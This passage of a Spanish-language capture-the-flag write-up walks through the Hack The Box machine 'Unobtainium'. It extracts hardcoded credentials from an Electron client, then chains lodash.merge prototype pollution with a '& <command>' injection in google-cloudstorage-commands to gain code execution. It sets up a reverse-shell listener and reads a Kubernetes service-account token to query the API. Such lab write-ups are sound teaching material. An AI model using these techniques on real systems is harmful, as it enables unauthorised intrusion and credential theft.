+    $("#but_submit").click(function(){
+        var message = $("#message").val().trim();
+        $.ajax({
+        url: 'http://unobtainium.htb:31337/',
+        type: 'put',
+        dataType:'json',
+        contentType:'application/json',
+        processData: false,
+        data: JSON.stringify({"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"text": message}}),
+        success: function(data) {
+            //$("#output").html(JSON.stringify(data));
+            $("#output").html("Message has been sent!");
+        }
+    });
+});
+});
+</code></pre>
+
+<blockquote>
+  <p><strong>Además del pequeño detalle que tenemos unas credenciales</strong> 😲</p>
+</blockquote>
+
+<p>Pues veamos esto en funcionamiento…</p>
+
+<p>Ya vimos los fuentes y no hay nada extraño que nos haga pensar que vamos a ser espiados :P instalémosla:</p>
+
+<pre><code class="language-bash">❱ dpkg -i unobtainium_1.0.0_amd64.deb
+</code></pre>
+
+<p>Después de unos segundos ya lo tendríamos instalado en el sistema, lo ejecutamos y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB.png" alt="338bash_exec_unobtainiumDEB" /></p>
+
+<p>Es una aplicación creada con <a href="https://www.electronjs.org/"><strong>Electron</strong></a> (ya hemos visto cositas de él en otro post que no reseño para no spoiler la máquina en la que se usa, pero esta por acá).</p>
+
+<p>Al abrirlo nos indica que no encuentra el dominio <code>unobtainium.htb</code>, pues agregándolo al archivo <a href="https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html">/etc/hosts</a> se soluciona:</p>
+
+<pre><code class="language-bash">❱ cat /etc/hosts
+...
+10.10.10.235  unobtainium.htb
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_done.png" alt="338bash_exec_unobtainiumDEB_done" /></p>
+
+<p>Esto nos da a entender que el software se esta comunicando para X cosa con la dirección IP <code>10.10.10.235</code>, o sea, la máquina (<strong>ya vimos en los archivos del paquete el porqué</strong>)…</p>
+
+<p>Dando algunas vueltas y clics llegamos al apartado <strong>Todo</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_todo.png" alt="338bash_exec_unobtainiumDEB_todo" /></p>
+
+<p>Tenemos una lista de tareas, pero me dejan más perdido de lo que estaba, así que seguí probando el software y caemos en <strong>Post Messages</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_postMessages.png" alt="338bash_exec_unobtainiumDEB_postMessages" /></p>
+
+<p>Que si recordamos estaba el archivo <code>app.js</code> que era el encargado de esta parte, la de postear los mensajes en la ruta <code>http://unobtainium.htb:31337/</code>.</p>
+
+<p>Después de mandar algunos mensajes (“hola”, “test” y “esto”) y estar visitando esa <strong>URL</strong> vemos que por cada petición varía lo que se muestra, no siempre tenemos el mismo output aunque no cambiemos nada en la petición, hagamos un bucle de 10 peticiones para que se entienda lo que digo:</p>
+
+<blockquote>
+  <p><em>(Cada vez que subimos un mensaje nos tiene que responder <code>Message has been sent!</code>, si no, no se esta subiendo el mensaje)</em></p>
+</blockquote>
+
+<pre><code class="language-bash">❱ for i in $(seq 1 10); do echo -n "$i &gt;&gt; "; curl -k -s http://unobtainium.htb:31337; echo; sleep 1; done
+</code></pre>
+
+<pre><code class="language-bash">1 &gt;&gt; [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
+2 &gt;&gt; [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
+3 &gt;&gt; [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
+4 &gt;&gt; [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
+5 &gt;&gt; [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
+6 &gt;&gt; [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
+7 &gt;&gt; []
+8 &gt;&gt; [{"icon":"__","text":"hola","id":1,"timestamp":1625093446861,"userName":"felamos"},{"icon":"__","text":"test","id":2,"timestamp":1625093587859,"userName":"felamos"}]
+9 &gt;&gt; []
+10 &gt;&gt; [{"icon":"__","text":"esto","id":1,"timestamp":1625093741331,"userName":"felamos"}]
+</code></pre>
+
+<p>Todas son creadas por <strong>felamos</strong> (también lo vimos en el archivo <code>app.js</code>). No sé el porqué a veces no muestra o muestra cualquier mensaje… Pero bueno, los vemos reflejados en el puerto <strong>31337</strong>, o sea, esa es la API de la que se habla en el ítem 2 del <strong>todo</strong>.</p>
+
+<p>Además tenemos el formato con el que son guardadas, vemos un campo <code>icon</code> (que no me imagino para que pueda ser) y los demás que si tienen sentido.</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Jugando con <strong>BurpSuite</strong> y con las variables de entorno en <strong>Linux</strong> logramos interceptar la petición al enviar un mensaje:</p>
+
+<p>Validamos el puerto por el que escucha el proxy de <strong>Burp</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_check_port.png" alt="338burp_check_port" /></p>
+
+<p>Seteamos una variable de <strong>Linux</strong> que toma el proxy:</p>
+
+<pre><code class="language-bash">❱ export http_proxy=http://127.0.0.1:8080/
+</code></pre>
+
+<p>Ponemos a <strong>Burp</strong> en escucha y enviamos un mensaje:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_exec_unobtainiumDEB_burp.png" alt="338bash_exec_unobtainiumDEB_burp" /></p>
+
+<p>Y en <strong>Burp</strong> recibimos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_message_burp.png" alt="338burp_unobtainium_message_burp" /></p>
+
+<blockquote>
+  <p>(Si nos les funciona a la primera, cierren el programa, pongan el proxy en escucha y vuelvanlo a abrir. O pueda que hayan declarado la variable en una terminal distinta de la que usan para ejecutar el binario :O)</p>
+</blockquote>
+
+<p>Vemos como viaja la petición, tenemos la versión de <strong>Electron</strong> y de nuevo las credenciales 🙃</p>
+
+<blockquote>
+  <p>No logramos hacer nada al intentar injectar cositas con el mensaje :(</p>
+</blockquote>
+
+<p>…</p>
+
+<h2 id="found-indexjs">Encontramos el código fuente de la API <a href="#found-indexjs">📌</a></h2>
+
+<p>Dándole algunas vuelticas al binario y sus peticiones me llamo la atención lo que hace cuando vemos la lista de tareas, o sea, <code>Todo</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo.png" alt="338burp_unobtainium_todo" /></p>
+
+<p>Vemos que la lista la obtiene de un archivo llamado <code>todo.txt</code> :o Esto nos da ideas de intentar leer otros archivos, intentando e intentando no encontramos ningún archivo 😔, pero encontramos un error al probar algunas cadenas o incluso dejando el campo vacío 😄</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_error.png" alt="338burp_unobtainium_todo_error" /></p>
+
+<p>Y si, no encuentra X archivo por lo tanto no sabe que hacer y devuelve un error (lo que esta mal es que se muestre el error así como así :P).</p>
+
+<p>Vemos unas rutas:</p>
+
+<pre><code class="language-html">/usr/src/app/index.js
+/usr/src/app/node_modules/express/lib/router/route.js
+/usr/src/app/node_modules/express/lib/router/layer.js
+/usr/src/app/node_modules/express/lib/router/index.js
+</code></pre>
+
+<p>Ver esas rutas me dio la idea de buscar en el sistema los archivos relacionados con <strong>unobtainium</strong> a ver si había alguno llamado <code>todo.txt</code> y así tener una idea de donde esta tomándolo el servidor web (pero nelson, no encontramos)</p>
+
+<p>(Pruebas, pruebas y pruebas) Apoyados en nuestra “abrizhion del paquete” vemos que el archivo <code>/usr/src/app/index.js</code> también lo tenemos y esta junto al objeto <code>package.json</code> (que ya vimos antes).</p>
+
+<p>Pues enviando tanto el archivo <code>index.js</code> como <code>package.json</code> en el campo <code>filename</code> logramos obtener respuesta (:</p>
+
+<p>🔦 <strong><u>package.json</u></strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_packageJSON.png" alt="338burp_unobtainium_todo_packageJSON" /></p>
+
+<p>Tomamos el contenido y lo guardamos en un archivo, para pasarlo a un formato más lindo podemos hacer esto:</p>
+
+<p>Remplazamos el texto <code>\n</code> por un salto de línea real y quitamos los escapes que hay en las comillas:</p>
+
+<pre><code class="language-bash">❱ sed -i 's/\\n/\n/g' todo_package.json 
+❱ sed -i 's/\\"/"/g' todo_package.json 
+❱ cat todo_package.json 
+</code></pre>
+
+<pre><code class="language-json">{
+  "name": "Unobtainium-Server",
+  "version": "1.0.0",
+  "description": "API Service for Electron client",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "author": "felamos",
+  "license": "ISC",
+  "dependencies": {
+    "body-parser": "1.18.3",
+    "express": "4.16.4",
+    "lodash": "4.17.4",
+    "google-cloudstorage-commands": "0.0.1"
+  },
+  "devDependencies": {}
+}
+</code></pre>
+
+<p>Opa, es la descripción del app, vemos las dependencias (librerías que usa) y sus versiones, me gusta.</p>
+
+<p>Dándole un formato lindo al archivo <code>index.js</code> obtenemos el código base de la aplicación :o</p>
+
+<pre><code class="language-bash">❱ sed -i 's/\\n/\n/g' todo_index.js 
+❱ sed -i 's/\\t/  /g' todo_index.js 
+❱ sed -i 's/\\"/"/g' todo_index.js 
+❱ cat todo_index.js
+</code></pre>
+
+<blockquote>
+  <p>Agregue unos comentarios para que sea un poco más entendible cada parte.</p>
+</blockquote>
+
+<pre><code class="language-js">var root = require("google-cloudstorage-commands");
+const express = require('express');
+const { exec } = require("child_process");
+const bodyParser = require('body-parser');
+const _ = require('lodash');
+const app = express();
+var fs = require('fs');
+
+const users = [
+  {name: 'felamos', password: 'Winter2021'},
+  {name: 'admin', password: Math.random().toString(32), canDelete: true, canUpload: true},
+];
+
+let messages = [];
+let lastId = 1;
+
+function findUser(auth) {
+  return users.find((u) =&gt;
+    u.name === auth.name &amp;&amp;
+    u.password === auth.password);
+}
+
+app.use(bodyParser.json());
+
+// Validamos el mensaje que creamos (Método GET)
+app.get('/', (req, res) =&gt; {
+  res.send(messages);
+});
+
+// Sube el mensaje (Método PUT)
+app.put('/', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+
+  if (!user) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  const message = {
+    icon: '__',
+  };
+
+  _.merge(message, req.body.message, {
+    id: lastId++,
+    timestamp: Date.now(),
+    userName: user.name,
+  });
+
+  messages.push(message);
+  res.send({ok: true});
+});
+
+// Borra el mensaje (Método DELETE)
+app.delete('/', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+
+  if (!user || !user.canDelete) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  messages = messages.filter((m) =&gt; m.id !== req.body.messageId);
+  res.send({ok: true});
+});
+
+// Al parecer sube un archivo (Método POST)
+app.post('/upload', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  filename = req.body.filename;
+  root.upload("./",filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+});
+
+// Extrae la info de un archivo y la muestra (Método POST)
+app.post('/todo', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  filename = req.body.filename;
+        testFolder = "/usr/src/app";
+        fs.readdirSync(testFolder).forEach(file =&gt; {
+                if (file.indexOf(filename) &gt; -1) {
+                        var buffer = fs.readFileSync(filename).toString();
+                        res.send({ok: true, content: buffer});
+                }
+        });
+});
+
+app.listen(3000);
+console.log('Listening on port 3000...');
+</code></pre>
+
+<p>Perfecto, perfectisimoooooooooooooooooooooooo, varias cositas para ver…</p>
+
+<p>Vemos los usuarios encargados de hacer las peticiones, a <strong>admin</strong> es la primera vez que lo vemos, pero poco podemos hacer con él, ya que su contraseña es random :(</p>
+
+<blockquote>
+  <p><strong><u>admin</u></strong> tiene dos items que <strong><u>felamos</u></strong> no tiene, <code>canDelete</code> y <code>canUpdate</code>, los dos están en <strong><u>true</u></strong>.</p>
+</blockquote>
+
+<p>Esto toma sentido si miramos la función que sube un archivo:</p>
+
+<p>🔦 <strong><u>/upload</u></strong> - <strong>¿user.canUpload?</strong></p>
+
+<pre><code class="language-js">app.post('/upload', (req, res) =&gt; {
+  const user = findUser(req.body.auth || {});
+  if (!user || !user.canUpload) {
+    res.status(403).send({ok: false, error: 'Access denied'});
+    return;
+  }
+
+  filename = req.body.filename;
+  root.upload("./",filename, true);
+  res.send({ok: true, Uploaded_File: filename});
+});
+</code></pre>
+
+<p>Válida si el usuario que esta haciendo la petición trae consigo el ítem <code>canUpload</code> encendido, si sí, toma el valor de <code>filename</code> y lo sube al servidor a la ruta en la que esté el archivo <code>index.js</code>, o sea, si logramos subir un archivo podríamos ver su contenido con el feature <code>Todo</code> (:</p>
+
+<p>Perfectoowowow, pues podríamos intentar jugar con ese objeto y el usuario <strong>felamos</strong> a ver si logramos subir o crear un archivo:</p>
+
+<p><strong>Si hacemos peticiones hacia el recurso <code>/upload</code> sin el objeto</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_withoutCanUP.png" alt="338burp_unobtainium_upload_withoutCanUP" /></p>
+
+<p><strong>Claramente no nos deja, ahora intentemos con el objeto <code>"canUpload":true</code>:</strong></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_withCanUP_fail.png" alt="338burp_unobtainium_upload_withCanUP_fail" /></p>
+
+<p>Pero tampoco nos deja :(</p>
+
+<p>Probando y probando no logramos subir nada… Leyendo lo que hace la función <code>/upload</code> vemos que para el trámite usa una -función- de una de las librerías:</p>
+
+<pre><code class="language-js">var root = require("google-cloudstorage-commands");
+...
+...
+  root.upload("./",filename, true);
+...
+</code></pre>
+
+<p>Buscando info sobre ella (estaba buscando su uso, pero de los primeros resultados había uno que hablaba de vulnerabilidades :o) encontramos que es una librería deprecada yyyy que tiene una vulnerabilidad:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_googleCloudStorage_commandInj.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opa, curiosamente es el mismo formato que tenemos nosotros en el script. La vulnerabilidad es sencilla, una inyección de comandos por culpa de una mala sanitización (:</p>
+
+<ul>
+  <li><a href="https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431">Command Injection - <strong>google-cloudstorage-commands</strong></a>.</li>
+</ul>
+
+<p><strong><em>La cosa es que este bug no nos permitirá <u>subir un archivo</u>, ya que no le indicara al servicio que nos active el objeto <code>canUpload</code>. Pero esta interesante tenerlo por si conseguimos asignarnos el objeto.</em></strong></p>
+
+<p>Con la idea de mirar las librerías nos situamos ahora en <a href="https://lodash.com/">lodash</a>, que es usada en la creación del mensaje:</p>
+
+<pre><code class="language-js">const _ = require('lodash');
+...
+...
+  _.merge(message, req.body.message, {
+    id: lastId++,
+    timestamp: Date.now(),
+    userName: user.name,
+  });
+...
+</code></pre>
+
+<p>Ahí están los campos que vimos al hacer las 10 peticiones con el <strong>for</strong> y el mensaje es manipulado con <code>req.body.message</code>.</p>
+
+<p>Algo que vemos es el uso de la función <a href="https://lodash.com/docs/4.17.15#merge">merge()</a>, que básicamente juega con tres objetos:</p>
+
+<ul>
+  <li>(1) <code>message</code>.</li>
+  <li>(2) <code>req.body.message</code>.</li>
+  <li>(3) <code>id - timestamp - username</code>.</li>
+</ul>
+
+<p>Y los usa para tomar las propiedades de los objetos <code>2</code> y <code>3</code> yyyyy heredárselos al objeto <code>1</code>, así de sencillo.</p>
+
+<p><a href="https://masteringjs.io/tutorials/lodash/merge">Este es un ejemplo</a> que encontré:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_mergeFunc_example.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y esta sería una simulación de lo que pasa al crear el mensaje y como la variable <code>message</code> hereda el valor del mensaje que enviamos junto a los demás objetos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_mergeFunc_simulationMessage.png" alt="338google_mergeFunc_simulationMessage" /></p>
+
+<p>Perfecto, sabemos como se genera toooda la trama que vemos al crear un mensaje (:</p>
+
+<p>…</p>
+
+<h2 id="prototype-pollution">Prototype Pollution en <u>lodash.merge</u> para asignar <u>canUpdate</u> al usuario <u>felamos</u> <a href="#prototype-pollution">📌</a></h2>
+
+<p>La cosa es que buscando info sobre <strong>merge()</strong> y si existen vulnerabilidades para ella nos damos cuenta de que sí, existen cositas para jugar…</p>
+
+<ul>
+  <li><a href="https://snyk.io/vuln/SNYK-JS-LODASHMERGE-173732">Prototype Pollution -  <strong>lodash.merge</strong></a>.</li>
+</ul>
+
+<p>La <a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications">contaminación de prototipos</a> se basa en la inyección de propiedades dentro de -prototipos- existentes en JS, como pueden ser los <strong>objetos</strong>.</p>
+
+<p>Cuando un objeto es creado va a contener propiedades y métodos necesarios de un prototipo (ya que JS esta basado en prototipos), esos prototipos contienen atributos “mágicos” o “esenciales” tales como <code>_proto_</code>, <code>constructor</code> y <code>prototype</code>. Lo que pasa es que <strong>JS</strong> permite que esos atributos sean alterados, esto (por culpa de <strong>merge()</strong>) le da la mano al atacante (a nosotros) de sobreescribir o contaminar objetos de la aplicación 🤯</p>
+
+<p>Nos guiaremos de este recurso para probar la contaminación:</p>
+
+<ul>
+  <li><a href="https://github.com/kimmobrunfeldt/lodash-merge-pollution-example">Demonstration of <strong>_.merge</strong> pollution vulnerability</a>.</li>
+</ul>
+
+<p>Lo que hace es subir un archivo que contiene el atributo -mágico- <code>_proto_</code> con el objeto que quiere contaminar, o sea, cambiar.</p>
+
+<p>Sube <code>attack.json</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_pollution_attackJSON.png" alt="338google_pollution_attackJSON" /></p>
+
+<p>Muy sencillo, al usuario <code>john.doe@mail.com</code> le asigna el objeto <code>admin</code>…</p>
+
+<p>Nosotros podríamos probar a asignar <code>canUpdate</code> al usuario <strong>felamos</strong> usando el mismo atributo e intentar <strong>subir (<code>/upload</code>)</strong> algún archivo 👀:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_withCanUP_fail.png" alt="338burp_unobtainium_upload_pollution_withCanUP_fail" /></p>
+
+<p>Pero no, espero que alguno sepa ya el porqué… :P</p>
+
+<p>Básicamente es porque la función vulnerable (<code>merge()</code>) esta en la creación del mensaje y no en la subida del archivo, entonces primero debemos contaminar el objeto para luego ahí si probar si se nos asignó el poder de subir archivos (:</p>
+
+<p>Creamos mensaje maligno :P</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_message_pollution_withCanUP.png" alt="338burp_unobtainium_message_pollution_withCanUP" /></p>
+
+<p>Y ahora intentamos subir un archivoooooooooooooooooooooooooooooo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_withCanUP_fail.png" alt="338burp_unobtainium_upload_pollution_withCanUP_done" /></p>
+
+<p>PERFECTOOOOOOOOOO, podemos subir archivoooooooooooslsssssssslakdjflasdflasjdfl (:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_gif_letsgodrake.gif" style="display: block; margin-left: auto; margin-right: auto; width: 60%;" /></p>
+
+<p>Intentando ver el archivo (que no tiene contenido :P) el servidor se muere e.e</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_pollution_holaTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Peeeero tooodos tranquilos, recordemos nuestra vulnerabilidad con <code>google-cloudstorage-commands</code>.</p>
+
+<p>…</p>
+
+<h2 id="prototype-pollution-rce">RCE = Prototype Pollution (<u>lodash.merge</u>) + Command Injection (<u>google-cloudstorage</u>) <a href="#prototype-pollution-rce">📌</a></h2>
+
+<p>Ya podemos crear archivos, tenemos la posibilidad de pasarle el nombre del archivo, veamos como era la inyección de comandos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_googleCloudStorage_commandInjCut.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Simplemente debemos colocar:</p>
+
+<pre><code class="language-js">&amp; &lt;comando_que_queremos_ejecutar&gt;
+</code></pre>
+
+<p>Va a tomar un nombre vacío y después ejecutaría el comando, aún no hemos comprobado que funcione, pero pa eso estamos, ¿no? a veeeeeeeeer:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_idINholaTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lo que queremos es que tome el resultado del comando <code>id</code> y lo guarde en el archivo <code>hola.txt</code>, así validamos su contenido con <strong>Todo</strong>, el archivo se creó, por lo que esperamos que se haya ejecutado el comando, validemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_todo_pollution_idINholaTXT.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Yyyyyyyy sí, <strong>tenemos ejecución remota de comandosssssss</strong>, que bestialidad esooooooooo, me encantoooooooooooooooo…</p>
+
+<p>Pues aprovechemonos de esto para entablarnos una Reverse Shell.</p>
+
+<p>Nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Y ejecutamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338burp_unobtainium_upload_pollution_revsh.png" alt="338burp_unobtainium_upload_pollution_revsh" /></p>
+
+<p>Revisamos nuestro listener yyyyyyyyyyyyyyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_nc_pollutionRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Sip, es bastante fea jajaj, hacemos un tratamiento de TTY superrápido y tamos listos pa seguir (:</p>
+
+<ul>
+  <li><a href="https://lanzt.gitbook.io/cheatsheet-pentest/tty">https://lanzt.gitbook.io/cheatsheet-pentest/tty</a>.</li>
+</ul>
+
+<p>Estamos en un contenedor (: y en él tenemos acceso a la flag de usuario <code>user.txt</code>.</p>
+
+<p>…</p>
+
+<p>Con ayuda de <strong>Python</strong> creamos un script que ya sea, nos ejecuta algunos comandos remotamente o nos entabla una Shell en el propio script, ahí se los dejo (:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/pollutionRCE.py">pollutionRCE.py</a></p>
+</blockquote>
+
+<p>…</p>
+
+<h1 id="lateral-webapp-devnode">docker-webapp -&gt; docker-devnode <a href="#lateral-webapp-devnode">#</a></h1>
+
+<p>Estando dentro encontramos poquitas cosas, enumerando las variables de entorno tenemos algunas referencias a <strong>Kubernetes</strong>:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ env
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_env.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>La aplicación en <code>10.96.137.170:3000</code> fue la que explotamos. Nos llama la atención <code>10.96.0.1:443</code>, jugando con <code>cURL</code> nos responde:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ curl -k https://10.96.0.1:443
+</code></pre>
+
+<pre><code class="language-json">{
+  "kind": "Status",
+  "apiVersion": "v1",
+  "metadata": {
+    
+  },
+  "status": "Failure",
+  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
+  "reason": "Forbidden",
+  "details": {
+    
+  },
+  "code": 403
+}
+</code></pre>
+
+<p>Jmmm… Investigando sobre <strong>Kubernetes</strong> encontramos cositas interesantes:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_necesidadkubernetes.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<blockquote>
+  <p>Tomada de: <a href="https://www.xataka.com/otros/docker-a-kubernetes-entendiendo-que-contenedores-que-mayores-revoluciones-industria-desarrollo">docker-a-kubernetes</a>.</p>
+</blockquote>
+
+<p>Y si, ahí entra <strong>Kubernetes</strong>:</p>
+
+<p>En pocas palabras es un gestionador de contenedores (el “maestro de orquesta”), ayuda a reunir tooodos los contenedores y armar clústeres (para que trabajen como si fueran uno), ya teniéndolos es muuuucho más sencillo el administrarlos, implementarlos y escalarlos.</p>
+
+<ul>
+  <li><a href="https://kubernetes.io/es/docs/concepts/overview/what-is-kubernetes/">kubernetes.io - What is <strong>Kubernetes</strong></a>.</li>
+  <li><a href="https://azure.microsoft.com/es-es/topic/what-is-kubernetes/">azure.microsoft.com - What is <strong>Kubernetes</strong></a>.</li>
+  <li><a href="https://www.redhat.com/es/topics/containers/what-is-kubernetes">redhat.com - What is <strong>Kubernetes</strong></a>.</li>
+</ul>
+
+<p>Buscando como podemos comunicarnos con <strong>Kubernetes</strong> llegamos a <a href="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/#without-using-a-proxy">este recurso</a>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338google_accessAPI_curl.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Validando si tenemos los archivos necesarios vemos que si:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/var/run/secrets/kubernetes.io/serviceaccount$ ls
+ca.crt  namespace  token
+</code></pre>
+
+<hr />
+
+<h2 id="expl-webapp-api-kubectl">Jugando con la <u>API</u> y con <u>kubectl</u> <a href="#expl-webapp-api-kubectl">📌</a></h2>
+
+<p>Así que generemos esas variables e intentemos de nuevo usar <code>cURL</code>:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:~$ APISERVER=https://10.96.0.1:443
+root@webapp-deployment-5d764566f4-mbprj:~$ SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+root@webapp-deployment-5d764566f4-mbprj:~$ TOKEN=$(cat ${SERVICEACCOUNT}/token)
+root@webapp-deployment-5d764566f4-mbprj:~$ CACERT=${SERVICEACCOUNT}/ca.crt
+</code></pre>
+
+<p>Intentamos la petición hacia la <strong>API</strong>:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/$ curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
+</code></pre>
+
+<pre><code class="language-json">{
+  "kind": "APIVersions",
+  "versions": [
+    "v1"
+  ],
+  "serverAddressByClientCIDRs": [
+    {
+      "clientCIDR": "0.0.0.0/0",
+      "serverAddress": "10.10.10.235:8443"
+    }
+  ]
+}
+</code></pre>
+
+<p>Bien, peeeeeeeeeeeeerfecto.</p>
+
+<p>Vemos que externamente la API esta en el puerto <strong>8443</strong>, por lo que podemos asignar las mismas variables (moviéndonos el archivo <code>token</code> y <code>cacert</code>) en nuestra máquina y debería funcionar (:</p>
+
+<p>Ya que nos podemos comunicar con la <strong>API</strong> empezaríamos a buscar cositas y ver como aprovecharnos de ellas…</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-kubernetes#architecture">Conceptos y arquitectura de <strong>Kubernetes</strong></a>.</li>
+</ul>
+
+<p>…</p>
+
+<p>En <a href="https://www.elladodelmal.com/2019/01/hacking-kubernetes-auditoria-de.html">este post</a> usan una herramienta llamada <a href="https://github.com/aquasecurity/kube-hunter">Kube-Hunter</a> que se encarga de encontrar posibles vulnerabilidades en <strong>Kubernetes</strong>, descargándola, moviéndola a la máquina y ejecutando solo nos muestra una vulnerabilidad:</p>
+
+<pre><code class="language-bash">root@webapp-deployment-5d764566f4-mbprj:/tmp/testeee$ ./kube-hunt --cidr 10.96.0.1
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338bash_pollutionSH_kubeHunter.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
